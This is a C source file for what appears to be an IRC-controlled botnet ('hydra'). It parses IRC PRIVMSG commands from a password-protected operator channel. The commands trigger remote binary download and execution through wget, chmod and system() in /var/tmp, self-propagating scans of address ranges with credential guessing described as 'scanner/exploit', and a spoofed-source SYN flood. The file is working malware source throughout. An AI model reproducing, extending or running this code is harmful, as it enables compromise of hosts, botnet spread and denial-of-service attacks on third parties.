/*
 * hydra_reqs.c
 * questions: esaltato, <esaltato@autistici.org>.
 *
 */

#include "../include/hydra_hds.h"

int pub_requests(sock_t *sp, reqs_t *req)
{
  /* read line-for-line. */
	token = strtok(netbuf, "\n");

  while (token != NULL)
  {
    /* save the received data. */
    sscanf(token, "%127s%31s%31s%31s%31s%31s%31s%31s", 
    req->rs_a, req->rs_b, req->rs_c, 
    req->rso_a, req->rso_b, req->rso_c, req->rso_d, req->rso_e);

    /* join in irc channel. */
    if (! strncmp(req->rs_b, "001", strlen(req->rs_b)))
    {
      cmd_init(sp);
    }

    /* reply to PING request. */
    else if (! strncmp(req->rs_a, "PING", strlen(req->rs_a)))
    {
      cmd_ping(sp);
    }

    /* manage the PRIVMSG requests. */
    else if (! strncmp(req->rs_b, "PRIVMSG", strlen(req->rs_b)))
    {
      // ACCESS
      /* manage .login request. */
      if (! wordcmp(":.login", req))                                                cmd_login(sp, req);
      /* manage .logout request. */
      else if (! (wordcmp(":.logout", req) | login_control(req) | login_status))    cmd_logout(sp, req);

      // MISC
      /* manage .upgrade request. */
      else if (! (wordcmp(":.upgrade", req) | login_control(req) | login_status))   cmd_upgrade(sp, req);
      /* manage .version request. */
      else if (! (wordcmp(":.version", req) | login_control(req) | login_status))   cmd_version(sp);
      /* manage .status request. */
      else if (! (wordcmp(":.status", req) | login_control(req) | login_status))    cmd_status(sp);
      /* manage .help request. */
      if (! (wordcmp(":.help", req) | login_control(req) | login_status))           cmd_help(sp);

      // SCANNER
      /* manage .scan request. */
      if (! (wordcmp(":.scan", req) | login_control(req) | login_status))           cmd_scan(sp, req);
      /* manage .advscan request. */
      else if (! (wordcmp(":.advscan", req) | login_control(req) | login_status))   cmd_advscan(sp, req);
      /* manage .recursive request. */
      else if (! (wordcmp(":.recursive", req) | login_control(req) | login_status)) cmd_recursive(sp, req);
      /* manage .recrd request. */
      else if (! (wordcmp(":.recrd", req) | login_control(req) | login_status))     cmd_recrd(sp, req);
      /* manage .stop request. */
      else if (! (wordcmp(":.stop", req) | login_control(req) | login_status))      cmd_stop(sp);

      // FLOODDER
      /* manage .synflood request. */
      else if (! (wordcmp(":.synflood", req) | login_control(req) | login_status))  cmd_synflood(sp, req);

      // IRC COMMANDS
      /* manage .join request. */
      else if (! (wordcmp(":.join", req) | login_control(req) | login_status))      cmd_join(sp, req);
      /* manage .part request. */
      else if (! (wordcmp(":.part", req) | login_control(req) | login_status))      cmd_part(sp, req);
      /* manage .quit request. */
      else if (! (wordcmp(":.quit", req) | login_control(req) | login_status))      cmd_quit(sp, req);

    } /* end PRIVMSG. */

    token = strtok(NULL, "\n");
  } /* end WHILE. */

  return EXIT_SUCCESS;
}

/* sigkill(void)       */
/* needed by signal(). */
void sigkill() { exit(0); }

/* cmd_join(sock_t *)          */
/* join channel after connect. */
int cmd_init(sock_t *sp)
{
  if (arg_send(sp->s_fd, channel_join, irc_room, irc_rkey))
    return EXIT_FAILURE;
  if (arg_send(sp->s_fd, command_who, data_ptr))
    return EXIT_FAILURE;

  return EXIT_SUCCESS;
}

/* cmd_ping(sock_t *)    */
/* reply PING with PONG. */
int cmd_ping(sock_t *sp)
{
  if (arg_send(sp->s_fd, ping_reply))
    return EXIT_FAILURE;

  return EXIT_SUCCESS;
}

/* cmd_login(sock_t *, reqs_t *)  */
/* log in the party-line bot.     */
int cmd_login(sock_t *sp, reqs_t *req)
{
  if (login_status)
    if (login(sp, req) == true)	login_status = true;

  return EXIT_SUCCESS;
}

/* cmd_logout(sock_t *, reqs_t *)  */
/* log out from party-line bot.    */
int cmd_logout(sock_t *sp, reqs_t *req)
{
  if (arg_send(sp->s_fd, logout_success, irc_room, req->rs_a))
    return EXIT_FAILURE;
  login_status = false;

  return EXIT_SUCCESS;
}

/* cmd_upgrade(sock_t *, reqs_t *)    */
/* upgrade hydra with newest version. */
int cmd_upgrade(sock_t *sp, reqs_t *req)
{
  unsigned url_upgrade_lens;
  char url_upgrade[256], temp[256];

  arg_send(sp->s_fd, upgrade_advise, irc_room, req->rso_b, req->rso_c);

  snprintf(temp, sizeof(temp)-1, "./%s", req->rso_c);

  if (! strncmp(temp, __argv, strlen(temp)))
    arg_send(sp->s_fd, upgrade_failure, irc_room, req->rso_c, req->rso_c);
  else
  {
    snprintf(url_upgrade, sizeof(url_upgrade), 
      "wget %s/%s -P /var/tmp && chmod +x /var/tmp/%s && /var/tmp/%s &",
      req->rso_b, req->rso_c, req->rso_c, req->rso_c);

    url_upgrade_lens = strlen(url_upgrade);
    url_upgrade[url_upgrade_lens] = 0;
    system(url_upgrade);

    arg_send(sp->s_fd, process_quit, "upgrade time!");

    free(sp);
    free(req);
    free(__argv);

    exit(true);
  }

  return EXIT_SUCCESS;
}

/* cmd_version(sock_t *)              */
/* show the current version of hydra. */
int cmd_version(sock_t *sp)
{
  arg_send(sp->s_fd, check_version, irc_room, hydra_version);

  return EXIT_SUCCESS;
}

int cmd_status(sock_t *sp)
{
  if (! max_pids)
    arg_send(sp->s_fd, check_nowork, irc_room);
  else	
    arg_send(sp->s_fd, check_status, irc_room, status_temp);

  return EXIT_SUCCESS;
}

/* cmd_help(sock_t *)  */
/* show help message.  */
int cmd_help(sock_t *sp)
{
  arg_send(sp->s_fd, "PRIVMSG %s :*\n", irc_room);
  arg_send(sp->s_fd, "PRIVMSG %s :* *** Access Commands:\n", irc_room);
  arg_send(sp->s_fd, "PRIVMSG %s :*\n", irc_room);
  arg_send(sp->s_fd, "PRIVMSG %s :* .login     <password>              - login to bot's party-line\n", irc_room);
  arg_send(sp->s_fd, "PRIVMSG %s :* .logout                            - logout from bot's party-line\n", irc_room);
  arg_send(sp->s_fd, "PRIVMSG %s :*\n", irc_room);
  arg_send(sp->s_fd, "PRIVMSG %s :* *** Misc Commands\n", irc_room);
  arg_send(sp->s_fd, "PRIVMSG %s :* \n", irc_room);
  arg_send(sp->s_fd, "PRIVMSG %s :* .upgrade   <url> <binary_name>     - upgrade binary from http url\n", irc_room);
  arg_send(sp->s_fd, "PRIVMSG %s :* .version                           - show the current version of bot\n", irc_room);
  arg_send(sp->s_fd, "PRIVMSG %s :* .status                            - show the status of bot\n", irc_room);
  arg_send(sp->s_fd, "PRIVMSG %s :* .help                              - show this help message\n", irc_room);
  arg_send(sp->s_fd, "PRIVMSG %s :*\n", irc_room);
  arg_send(sp->s_fd, "PRIVMSG %s :* *** Scan Commands\n", irc_room);
  arg_send(sp->s_fd, "PRIVMSG %s :*\n", irc_room);
  arg_send(sp->s_fd, "PRIVMSG %s :* .scan      <a> <b> <user> <passwd> - scanner/exploit with user:passwd\n", irc_room);
  arg_send(sp->s_fd, "PRIVMSG %s :* .advscan   <a> <b>                 - scanner/exploit with auto user:passwd\n", irc_room);
  arg_send(sp->s_fd, "PRIVMSG %s :* .recursive                         - advscan with local addr (A.B-range)\n", irc_room);
 	arg_send(sp->s_fd, "PRIVMSG %s :* .recrd                             - advscan with local addr (B-range random())\n", irc_room);
  arg_send(sp->s_fd, "PRIVMSG %s :* .stop                              - stop all actions (scan/flood)\n", irc_room);
  arg_send(sp->s_fd, "PRIVMSG %s :*\n", irc_room);
  arg_send(sp->s_fd, "PRIVMSG %s :* *** DDOS Commands:\n", irc_room);
  arg_send(sp->s_fd, "PRIVMSG %s :*\n", irc_room);
 	arg_send(sp->s_fd, "PRIVMSG %s :* .synflood  <host> <port> <secs>    - standard synflooder\n", irc_room);
  arg_send(sp->s_fd, "PRIVMSG %s :* \n", irc_room);
  arg_send(sp->s_fd, "PRIVMSG %s :* *** IRC Commands:\n", irc_room);
  arg_send(sp->s_fd, "PRIVMSG %s :*\n", irc_room);
  arg_send(sp->s_fd, "PRIVMSG %s :* .join      <channel> <password>    - join bot in selected room\n", irc_room);
  arg_send(sp->s_fd, "PRIVMSG %s :* .part      <channel>               - part bot from selected room\n", irc_room);
  arg_send(sp->s_fd, "PRIVMSG %s :* .quit                              - kill the current process\n", irc_room);
 	arg_send(sp->s_fd, "PRIVMSG %s :*\n", irc_room);

	return EXIT_SUCCESS;
}

/* cmd_scan(sock_t *, reqs_t *)  */
/* start the standard scanner.   */
int cmd_scan(sock_t *sp, reqs_t *req)
{
  /* check for input errors */
  if (parse_input_errors(sp, req, 4))
    return EXIT_FAILURE;

  if (max_pids > 0)
    arg_send(sp->s_fd, max_pids_block, irc_room);
  else
  {
    max_pids++;
    snprintf(status_temp, sizeof(status_temp), "%s.%s.0.0/16", 
      req->rso_b, req->rso_c);

    pid = fork();
    if (! pid)
    {
      signal(SIGKILL, sigkill);
      arg_send(sp->s_fd, start_scan, irc_room, 
        req->rso_b, req->rso_c, req->rso_d, req->rso_e);
      cmd_scan_central(sp, req, 1);
    }
    else g_pid = pid;
  }

  return EXIT_SUCCESS;
}

/* cmd_advscan(sock_t *, reqs_t *)  */
/* start the advance scanner.       */
int cmd_advscan(sock_t *sp, reqs_t *req)
{
  /* check for input errors */
  if (parse_input_errors(sp, req, 2))
    return EXIT_FAILURE;

  if (max_pids > 0) arg_send(sp->s_fd, max_pids_block, irc_room);
  else
  {
    max_pids++;
    snprintf(status_temp, sizeof(status_temp), "%s.%s.0.0/16", 
      req->rso_b, req->rso_c);

    pid = fork();
    if (! pid)
    {
      signal(SIGKILL, sigkill);
      arg_send(sp->s_fd, start_advscan, 
        irc_room, req->rso_b, req->rso_c);
      cmd_scan_central(sp, req, 2);
    }
    else g_pid = pid;
  }

  return EXIT_SUCCESS;
}

/* cmd_recursive(sock_t *, reqs_t *)            */
/* start the advance scanner in recursive mode. */
int cmd_recursive(sock_t *sp, reqs_t *req)
{
  if (max_pids > 0) arg_send(sp->s_fd, max_pids_block, irc_room);
  else
  {
    if (get_local_ip(sp, req) == true)
    {
      max_pids++;

      pid = fork();
      if (! pid)
      {
        signal(SIGKILL, sigkill);
        arg_send(sp->s_fd, start_recursive, 
          irc_room, req->rso_b, req->rso_c);
        cmd_scan_central(sp, req, 2);
      }
      else g_pid = pid;
    }
    else arg_send(sp->s_fd, error_local_ip, irc_room);
  }

  return EXIT_SUCCESS;
}

/* cmd_recrd(sock_t *, reqs_t *)                      */
/* start the advance scanner in  x.B.x.x random mode. */
int cmd_recrd(sock_t *sp, reqs_t *req)
{
  if (max_pids > 0) arg_send(sp->s_fd, max_pids_block, irc_room);
  else
  {
    if (! get_local_ip(sp, req))
    {
      max_pids++;

      srand(time(0));
      random_ct = rand();
      random_num = ((random_ct % 254) + 1);

      snprintf(req->rso_c, sizeof(req->rso_c), "%d", random_num);
      snprintf(status_temp, sizeof(status_temp), "%s.%s.0.0/16", 
        req->rso_b, req->rso_c);

      pid = fork();
      if (! pid)
      {
        signal(SIGKILL, sigkill);
        arg_send(sp->s_fd, start_recursive_rnd, 
          irc_room, req->rso_b, req->rso_c);
        cmd_scan_central(sp, req, 2);
      }
      else g_pid = pid;
    }
    else arg_send(sp->s_fd, error_local_ip, irc_room);
  }

  return EXIT_SUCCESS;
}

/* cmd_stop(sock_t *)        */
/* stop the current working. */
int cmd_stop(sock_t *sp)
{
  if (max_pids > 0)
  {
    arg_send(sp->s_fd, stop_actions, irc_room);
    kill(g_pid, 9);
  }

  return EXIT_SUCCESS;
}

/* cmd_synflood(sock_t *, reqs_t *)  */
/* start synflood attack.            */
int cmd_synflood(sock_t *sp, reqs_t *req)
{
  if (max_pids > 0)	arg_send(sp->s_fd, max_pids_block, irc_room);
  else
  {
    max_pids++;
    snprintf(status_temp, sizeof(status_temp), "%s", 
      req->rso_b);

    pid = fork();
    if(! pid)
    {
      signal(SIGKILL, sigkill);

      srchost  = host2ip(spoof_addr);
      dsthost  = host2ip(req->rso_b);
      uport    = atoi(req->rso_c);
      useconds = atoi(req->rso_d);

      arg_send(sp->s_fd, start_synflood, 
        irc_room, req->rso_b, uport, useconds);
      cmd_call_synf(sp, srchost, dsthost, uport, useconds);
    }
    else g_pid = pid;
  }

  return EXIT_SUCCESS;
}

/* cmd_join(sock_t *, reqs_t *)  */
/* join bot in some channel.     */
int cmd_join(sock_t *sp, reqs_t *req)
{
  arg_send(sp->s_fd, channel_join, req->rso_b, req->rso_c);
  return EXIT_SUCCESS;
}

/* cmd_part(sock_t *, reqs_t *)  */
/* part bot from some channel.   */
int cmd_part(sock_t *sp, reqs_t *req)
{
  arg_send(sp->s_fd, channel_part, req->rso_b, "hydra?");
}

/* cmd_quit(sock_t *, reqs_t *)            */
/* quit from irc and kill current process. */
int cmd_quit(sock_t *sp, reqs_t *req)
{
  arg_send(sp->s_fd, process_quit, "bye tards!");

  free(sp);
  free(req);

  kill(0, 9);
  exit(0);

  return EXIT_SUCCESS;
}
